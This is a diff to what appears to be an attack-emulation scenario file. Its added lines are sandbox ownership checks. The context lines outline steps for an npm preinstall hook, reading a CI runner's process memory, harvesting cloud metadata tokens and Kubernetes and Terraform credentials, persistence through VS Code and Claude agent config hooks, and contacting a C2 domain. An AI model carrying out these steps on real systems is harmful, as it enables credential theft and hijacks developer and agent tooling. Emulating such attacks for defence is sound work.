@@ -172,6 +172,7 @@ steps:
   - id: step-01
     name: "npm preinstall runs setup.mjs, which launches a detached runtime on math_init.js"
     command: |
+      rm -rf /tmp/cortexsim-mp-028 && mkdir -m 700 /tmp/cortexsim-mp-028 || { echo "sandbox /tmp/cortexsim-mp-028 could not be created fresh: something else is at that path" >&2; exit 1; }
       W=/tmp/cortexsim-mp-028/pkg
       mkdir -p "$W" /tmp/cortexsim-mp-028/run
       cat > "$W/package.json" <<'JSON'
@@ -209,6 +210,7 @@ steps:
   - id: step-02
     name: "Python helper reads /proc/<pid>/maps and /proc/<pid>/mem of a Runner.Worker process"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp-028 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-028 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       D=/tmp/cortexsim-mp-028
       cp /bin/sleep "$D/Runner.Worker"
       python3 - "$D/Runner.Worker" <<'PY'
@@ -249,6 +251,7 @@ steps:
   - id: step-03
     name: "Query the metadata token endpoint and harvest k8s token, kubeconfig and Terraform state"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp-028 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-028 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       D=/tmp/cortexsim-mp-028
       H="${IMDS_HOST:-${STAGE_HOST:-127.0.0.1}}"
       TOK=$(curl -s --max-time 2 -X PUT "http://$H/latest/api/token" -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
@@ -283,6 +286,7 @@ steps:
   - id: step-04
     name: "Persist via .vscode/tasks.json (folderOpen) and .claude/settings.json (SessionStart)"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp-028 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-028 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       WS=/tmp/cortexsim-mp-028/workspace
       mkdir -p "$WS/.vscode" "$WS/.claude"
       cp /tmp/cortexsim-mp-028/pkg/setup.mjs "$WS/.vscode/setup.mjs"
@@ -310,6 +314,7 @@ steps:
   - id: step-05
     name: "Resolve the rotated C2 domain, build the gzip+AES-256-CBC (stand-in for GCM)+RSA-OAEP bundle and POST it to /router"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-mp-028 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-028 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       D=/tmp/cortexsim-mp-028
       dig +short awqhnjewqjkl.icu @${LAB_RESOLVER:-127.0.0.53}
       python3 -c 'import json,os,sys; d=sys.argv[1]; print(json.dumps({f: os.path.getsize(os.path.join(r, f)) for r, _, fs in os.walk(d) for f in fs}))' "$D/harvest" | gzip > "$D/bundle.json.gz"
